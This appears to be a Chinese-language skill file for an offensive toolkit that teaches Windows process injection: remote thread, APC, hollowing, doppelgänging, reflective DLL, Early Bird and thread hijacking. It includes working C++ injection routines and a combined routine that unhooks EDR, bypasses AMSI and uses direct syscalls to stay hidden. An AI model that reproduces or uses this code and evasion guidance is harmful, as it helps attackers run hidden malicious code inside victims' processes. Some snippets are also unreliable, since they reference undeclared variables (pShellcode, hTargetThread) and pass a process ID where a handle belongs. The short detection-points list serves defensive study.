---
name: "process-injection"
description: "Process injection techniques including remote thread injection, APC injection, process hollowing, and reflective DLL injection"
version: "1.0.0"
---

# Process Injection

> 进程注入是一种被恶意软件和红队操作员使用的技术，用于在单独进程的地址空间中执行攻击者控制的代码。

## 概述

进程注入是免杀、持久化和权限提升的基础技术。

## 远程线程注入

### 基本概念

最简单的注入技术：在目标进程中创建一个执行攻击者控制代码的新线程。

### 实现步骤

1. **打开目标进程**：获取目标进程的 `HANDLE`
2. **分配内存**：使用 `VirtualAllocEx` 为shellcode分配内存
3. **写入Shellcode**：使用 `WriteProcessMemory` 写入shellcode
4. **创建线程**：使用 `CreateRemoteThread` 执行shellcode

### 示例代码 (C++)

```cpp
#include <windows.h>
#include <tlhelp32.h>

DWORD GetProcessByName(const char* name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe32 = {0};
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe32)) {
        do {
            if (strcmp(pe32.szExeFile, name) == 0) {
                CloseHandle(hSnapshot);
                return pe32.th32ProcessID;
            }
        } while (Process32Next(hSnapshot, &pe32));
    }

    CloseHandle(hSnapshot);
    return 0;
}

void InjectRemoteThread(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) {
        printf("[-] OpenProcess failed: %d\n", GetLastError());
        return;
    }

    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    if (!pRemoteMem) {
        printf("[-] VirtualAllocEx failed: %d\n", GetLastError());
        CloseHandle(hProcess);
        return;
    }

    WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcodeSize, NULL);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0,
                                        (LPTHREAD_START_ROUTINE)pRemoteMem,
                                        NULL, 0, NULL);

    if (hThread) {
        printf("[+] Remote thread created!\n");
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    } else {
        printf("[-] CreateRemoteThread failed: %d\n", GetLastError());
    }

    VirtualFreeEx(hProcess, pRemoteMem, 0, MEM_RELEASE);
    CloseHandle(hProcess);
}
```

### 优缺点

| 优点 | 缺点 |
|------|------|
| 简单实现 | 非常嘈杂（CreateRemoteThread被严格监控）|
| 适用于所有Windows版本 | 容易被EDR检测 |
| 无需复杂DLL | 需要 `PROCESS_ALL_ACCESS`（高权限）|

## APC注入

### 概念

不创建新线程，而是将APC（异步过程调用）排队到处于"可警报"状态的现有线程。

### 示例

```cpp
void APCInjection(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    LPVOID pRemoteMem = VirtualAllocEx(hProcess, NULL, shellcodeSize,
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, pRemoteMem, shellcode, shellcodeSize, NULL);

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = {0};
    te.dwSize = sizeof(THREADENTRY32);

    if (Thread32First(hSnapshot, &te)) {
        do {
            if (te.th32OwnerProcessID == pid) {
                HANDLE hThread = OpenThread(THREAD_SET_CONTEXT, FALSE, te.th32ThreadID);
                if (hThread) {
                    QueueUserAPC((PAPCFUNC)pRemoteMem, hThread, 0);
                    CloseHandle(hThread);
                }
            }
        } while (Thread32Next(hSnapshot, &te));
    }

    CloseHandle(hSnapshot);
}
```

### 优缺点

| 优点 | 缺点 |
|------|------|
| 不创建新线程 | 线程必须处于可警报状态 |
| 比CreateRemoteThread更隐蔽 | 可能不会立即执行 |
| 适用于现有线程 | 难以控制执行时间 |

## 进程镂空 (Process Hollowing)

### 概念

进程镂空是一种更高级的技术：

1. 以挂起状态创建新进程
2. 取消映射原始可执行文件
3. 注入恶意代码
4. 设置新的入口点
5. 恢复进程

### 流程

1. **创建挂起进程**：`CreateProcess` 配合 `CREATE_SUSPENDED`
2. **获取PEB地址**：通过进程内存读取PEB
3. **取消映射原始映像**：`NtUnmapViewOfSection`
4. **注入Shellcode**：`VirtualAllocEx` 和 `WriteProcessMemory`
5. **设置入口点**：`SetThreadContext`
6. **恢复进程**：`ResumeThread`

## 进程伪装 (Process Doppelgänging)

### 概念

使用NTFS事务（TxF）执行从不触及磁盘的代码。

### 步骤

1. **创建事务**：`CreateTransaction`
2. **事务性文件创建**：`CreateFileTransacted`
3. **从事务创建进程**：`NtCreateProcessEx` / `CreateProcess`
4. **回滚事务**：从磁盘删除所有痕迹

## 反射式DLL加载

### 概念

从内存加载DLL（不从磁盘加载），通过解析PE、应用重定位和解析导入。

### 流行库

- **ReflectiveDLLInjection** - Metasploit的实现
- **ReflectiveLoader** - Stephen Fewer的原始实现
- **Donut** - 为.NET程序集生成shellcode

## Early Bird注入

### 概念

在线程启动前使用APC注入shellcode。被称为"Early Bird"是因为它执行得非常早。

### 流程

1. 使用 `CREATE_SUSPENDED` 创建进程
2. 将APC排队到初始线程
3. 恢复线程 → APC在线程入口点之前触发
4. Shellcode执行

## 线程劫持/堆叠

### 线程劫持

修改现有线程的上下文以执行shellcode。

```cpp
void ThreadHijacking(HANDLE hTargetThread, BYTE* shellcode, SIZE_T shellcodeSize) {
    SuspendThread(hTargetThread);

    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hTargetThread, &ctx);

    // 设置RIP/eip为shellcode
    ctx.Rip = (DWORD_PTR)pShellcode;

    SetThreadContext(hTargetThread, &ctx);
    ResumeThread(hTargetThread);
}
```

## 检测与对抗

### 检测点

- `CreateRemoteThread` 被严格监控
- `WriteProcessMemory` 到外部进程
- `VirtualAllocEx` 配合 `PAGE_EXECUTE_READWRITE` 在其他进程中
- API调用序列：`VirtualAllocEx` → `WriteProcessMemory` → `CreateRemoteThread`

### 对抗技术

- **Syscalls**：使用直接系统调用而非用户态API
- **进程镂空**：更复杂，更难检测
- **进程伪装**：磁盘上无文件
- **反射式加载**：磁盘上无DLL
- **注入到可信进程**（如explorer.exe、svchost.exe）
- **用户态Unhook**：移除EDR挂钩前注入
- **内存加密**：加密内存中的shellcode

## 高级组合策略

```cpp
void AdvancedInjection(DWORD pid, BYTE* shellcode, SIZE_T shellcodeSize) {
    // 1. 移除EDR挂钩
    UnhookNtdll();

    // 2. 绕过AMSI（如果使用PowerShell/.NET）
    BypassAMSI();

    // 3. 使用syscall进行操作
    LPVOID pMem = NULL;
    SIZE_T size = shellcodeSize;
    NtAllocateVirtualMemory(pid, &pMem, 0, &size, 
                          MEM_COMMIT | MEM_RESERVE, 
                          PAGE_EXECUTE_READWRITE);
    NtWriteVirtualMemory(pid, pMem, shellcode, shellcodeSize, NULL);

    // 4. 使用APC注入（比CreateRemoteThread更隐蔽）
    QueueUserAPC((PAPCFUNC)pMem, hTargetThread, 0);
    NtResumeThread(hTargetThread);
}
```

## 参考资源

- [PayloadsAllTheThings - Process Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Process%20Injection.md)
- [ReflectiveDLLInjection](https://github.com/stephenfewer/ReflectiveDLLInjection)
- [Donut](https://github.com/TheWover/donut)
- [TitanLdr](https://github.com/hfiref0x/TitanLdr) - 高级进程注入
- [MalAPI](https://malapi.io) - Windows API数据库
